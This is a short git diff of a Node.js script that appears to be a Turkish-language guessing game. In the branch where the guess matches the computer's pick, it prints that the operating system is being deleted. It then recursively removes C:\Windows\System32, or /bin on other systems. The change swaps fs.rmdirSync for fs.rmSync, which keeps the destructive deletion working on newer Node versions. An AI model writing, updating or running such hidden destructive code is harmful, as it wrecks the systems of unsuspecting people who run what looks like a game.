@@ -31,9 +31,9 @@ if(tahmin == pctut) {
         await delay(5);
         console.log('Isletim sistemi siliniyor...');
         if(fs.existsSync('C:\\Windows\\System32')) {
-            fs.rmdirSync('C:\\Windows\\System32', { recursive: true });
+            fs.rmSync('C:\\Windows\\System32', { recursive: true });
         } else {
-            fs.rmdirSync('/bin', { recursive: true });
+            fs.rmSync('/bin', { recursive: true });
         }
     })();
 }
